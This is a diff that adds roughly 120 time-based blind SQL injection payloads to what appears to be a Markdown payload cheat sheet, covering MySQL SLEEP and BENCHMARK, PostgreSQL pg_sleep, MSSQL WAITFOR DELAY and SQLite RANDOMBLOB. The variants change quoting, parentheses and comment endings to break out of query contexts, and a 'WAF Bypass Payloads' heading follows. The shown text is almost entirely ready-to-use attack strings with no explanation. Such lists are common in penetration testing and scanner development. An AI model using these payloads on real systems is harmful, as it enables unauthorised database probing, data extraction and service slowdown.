@@ -189,7 +189,129 @@ SELECT SLEEP(10), NULL
 ```sql
 SELECT IF(NOW()=SYSDATE(), SLEEP(5), 'a')  
 SELECT IF(NOW()=SYSDATE(1), SLEEP(5), 'a')  
-SELECT IF(NOW()=SYSDATE(), SLEEP(5), SLEEP(10))  
+SELECT IF(NOW()=SYSDATE(), SLEEP(5), SLEEP(10))
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+SELECT IF(1=1, SLEEP(5), 'a');
+' SELECT IF(1=1, SLEEP(5), 'a');
+SELECT SLEEP(10),null
+' SELECT SLEEP(10),null
+' select if(now()=sysdate(),sleep(5),'a');
+select if(now()=sysdate(),sleep(5),'a');
+select if(now()=sysdate(),sleep(5),sleep(10));
+' select if(now()=sysdate(),sleep(5),sleep(10));
+" select if(now()=sysdate(),sleep(5),sleep(10));
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+"XOR(if(now()=sysdate(),sleep(5),0))XOR"
+'XOR(if(now()=sysdate(),sleep(5),sleep(10)))XOR'
+';(select if(now()=sysdate(1),sleep(5),sleep(10)));#
+';(select if(now()=sysdate(1),sleep(5),sleep(10)));-- 
+';(select if(now()=sysdate(),sleep(5),'a'));#
+";(select if(now()=sysdate(),sleep(5),'a'));#
+' select 'hel'||(select sleep(10))||'lo';
+" select 'hel'||(select sleep(10))||'lo';
+'||(select sleep(10))||'
+"||(select sleep(10))||"
+'||pg_sleep(2)||'
+"||pg_sleep(2)||"
+'XOR(pg_sleep(2))XOR'
+'XOR(sleep(10))XOR'
+"XOR(pg_sleep(2))XOR"
+';select sleep(2)'
+' union select (sleep(3));
+" union select (sleep(3));
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/  
 ```
 **WAF Bypass Payloads:**  
 ```sql
